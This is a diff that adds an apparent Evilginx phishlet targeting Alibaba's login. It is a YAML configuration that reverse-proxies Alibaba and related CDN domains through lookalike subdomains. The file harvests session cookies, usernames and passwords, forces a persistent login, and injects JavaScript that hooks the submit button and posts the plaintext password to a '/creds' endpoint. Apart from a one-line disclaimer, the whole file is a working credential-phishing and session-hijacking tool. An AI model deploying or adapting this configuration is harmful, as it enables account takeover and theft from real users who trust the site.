@@ -1,0 +1,91 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+author: '@an0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'passport', orig_sub: 'passport', domain: 'alibaba.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'alibaba.com', session: true, is_landing: false}
+  - {phish_sub: 'insights', orig_sub: '', domain: 'alibaba.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'alibaba.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'i', domain: 'alibaba.com', session: true, is_landing: false}
+  - {phish_sub: 'carp', orig_sub: 'carp', domain: 'alibaba.com', session: true, is_landing: false}
+  - {phish_sub: 'message', orig_sub: 'message', domain: 'alibaba.com', session: true, is_landing: false}
+  - {phish_sub: 'sale', orig_sub: 'sale', domain: 'alibaba.com', session: true, is_landing: false}
+  - {phish_sub: 'marketing', orig_sub: 'marketing', domain: 'alibaba.com', session: true, is_landing: false}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'alicdn.com', session: true, is_landing: false}
+  - {phish_sub: 'aeis', orig_sub: 'aeis', domain: 'alicdn.com', session: true, is_landing: false}
+  - {phish_sub: 'g', orig_sub: 'g', domain: 'alicdn.com', session: true, is_landing: false}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'alicdn.com', session: true, is_landing: false}
+  - {phish_sub: 'is', orig_sub: 'is', domain: 'alicdn.com', session: true, is_landing: false}
+  - {phish_sub: 'gj', orig_sub: 'gj', domain: 'alicdn.com', session: true, is_landing: false}
+  - {phish_sub: 'oneid', orig_sub: 'oneid', domain: 'mmstat.com', session: true, is_landing: false}
+  - {phish_sub: 'cfus', orig_sub: 'cfus', domain: 'aliyun.com', session: true, is_landing: false}
+  - {phish_sub: 'us.ynuf', orig_sub: 'us.ynuf', domain: 'aliapp.org', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.alibaba.com', orig_sub: 'i', domain: 'alibaba.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.alibaba.com', orig_sub: 'i', domain: 'alibaba.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.alibaba.com', orig_sub: 'i', domain: 'alibaba.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'passport.alibaba.com', orig_sub: 'passport', domain: 'alibaba.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'passport.alibaba.com', orig_sub: 'passport', domain: 'alibaba.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'passport.alibaba.com', orig_sub: 'passport', domain: 'alibaba.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'passport.alibaba.com', orig_sub: 'www', domain: 'alibaba.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'passport.alibaba.com', orig_sub: '', domain: 'alibaba.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'passport.alibaba.com', orig_sub: 'www', domain: 'alibaba.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.alibaba.com', orig_sub: '', domain: 'alibaba.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'passport.alibaba.com', orig_sub: '', domain: 'alicdn.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.alibaba.com', orig_sub: '', domain: 'alicdn.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'passport.alibaba.com', orig_sub: '', domain: 'aliyun.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.alibaba.com', orig_sub: '', domain: 'aliyun.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'passport.alibaba.com', orig_sub: '', domain: 'mmstat.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.alibaba.com', orig_sub: '', domain: 'mmstat.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'passport.alibaba.com', orig_sub: '', domain: 'aliapp.org', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.alibaba.com', orig_sub: '', domain: 'aliapp.org', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: '.alibaba.com'
+    keys: ['cookie2', '_tb_token_', 'acs_usuc_t', '_hvn_login', 'csg', 'xman_us_t', 'xman_t', '.*,regexp']
+
+credentials:
+  username:
+    key: 'loginId'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+    
+force_post:
+  - path: '/newlogin/login.do'
+    search: 
+      - {key: 'loginId', search: '.*'}
+      - {key: 'password2', search: '.*'}
+     
+    force:
+      - {key: 'keepLogin', value: 'true'}
+    type: 'post'    
+login:
+  domain: 'passport.alibaba.com'
+  path: '/icbu_login.htm'
+
+js_inject:
+  - trigger_domains: ["passport.alibaba.com"]
+    trigger_paths: ["/icbu_login.htm"]
+    trigger_params: []
+    script: |
+      function lp(){
+        document.getElementsByName("submit-btn")[0].addEventListener("click", sendPass);
+        return;
+      }
+      function sendPass(){
+        var password = document.getElementsByName("password")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/creds', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("unenc_password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ lp(); }, 1000);
